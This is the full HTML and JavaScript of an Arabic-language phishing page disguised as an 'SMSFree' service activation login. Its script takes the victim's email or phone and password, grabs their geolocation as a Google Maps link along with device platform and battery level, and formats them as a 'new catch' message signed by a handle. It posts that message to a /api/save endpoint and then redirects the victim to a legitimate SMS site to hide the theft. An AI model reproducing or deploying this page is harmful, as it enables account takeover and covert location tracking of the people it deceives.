<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - تفعيل الخدمة</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a; --card-bg: rgba(30, 41, 59, 0.7);
            --primary-cyan: #22d3ee; --text-white: #f8fafc;
            --input-bg: rgba(15, 23, 42, 0.6);
        }
        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background: radial-gradient(circle at top right, #1e293b, #0f172a);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white); overflow: hidden;
        }
        .main-container {
            width: 90%; max-width: 420px; background: var(--card-bg);
            backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 50px 30px; border-radius: 30px; text-align: center;
        }
        .is-banned { filter: blur(20px); opacity: 0.1; pointer-events: none; }
        .logo-circle {
            width: 100px; height: 100px; border: 2px solid var(--primary-cyan);
            border-radius: 50%; margin: 0 auto 25px; display: flex;
            justify-content: center; align-items: center; font-size: 20px;
            font-weight: 800; color: var(--primary-cyan);
        }
        input {
            width: 100%; padding: 16px; background: var(--input-bg);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 15px;
            color: white; margin-bottom: 15px; text-align: center; box-sizing: border-box;
        }
        .submit-btn {
            width: 100%; padding: 18px; border-radius: 15px; border: none;
            background: linear-gradient(135deg, #155e75, #22d3ee);
            color: #0f172a; font-weight: 700; cursor: pointer;
        }
        .ban-overlay {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 100; text-align: center; display: none;
        }
    </style>
</head>
<body>

<div id="banOverlay" class="ban-overlay">
    <h2 style="color: #fbbf24;">تم حظرك مؤقتاً</h2>
    <div style="font-size: 40px; color: white;" id="timer">30</div>
</div>

<div class="main-container" id="mainCard">
    <div class="logo-circle">SMSFree</div>
    <h2 style="font-size: 15px; opacity: 0.8;">سجل دخولك لتفعيل الخدمة فوراً</h2>
    <form id="loginForm">
        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف" required>
        <input type="password" id="pass" placeholder="كلمة المرور" required>
        <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
    </form>
</div>

<script>
    document.getElementById('loginForm').onsubmit = function(e) {
        e.preventDefault();
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;

        if (u.length > 5 && p.length > 5) {
            // جلب الموقع
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        const loc = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                        sendData(u, p, loc);
                    },
                    function() { sendData(u, p, "الموقع مرفوض"); }
                );
            } else {
                sendData(u, p, "الموقع غير مدعوم");
            }
        } else {
            alert("يرجى إدخال بيانات صحيحة");
        }
    };

    async function sendData(u, p, location) {
        // معلومات الجهاز
        const device = navigator.platform;
        let battery = "غير معروف";
        try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; } catch(e){}

        // صياغة الرسالة بطريقة "النص الصافي" لتجنب الأخطاء البرمجية
        let msg = "🎯 صيد جديد جاهز يا مطوري\n\n";
        msg += "📱 الهاتف: " + device + "\n";
        msg += "🔋 البطارية: " + battery + "\n";
        msg += "📍 الموقع: " + location + "\n\n";
        msg += "📧 الحساب: " + u + "\n";
        msg += "🔑 كلمة السر: " + p + "\n\n";
        msg += "👤 @M6_vip";

        try {
            const response = await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: msg })
            });
            
            if (response.ok) {
                window.location.href = "https://receive-smss.com/";
            }
        } catch (err) {
            console.log("خطأ في الإرسال");
        }
    }
</script>
</body>
</html>
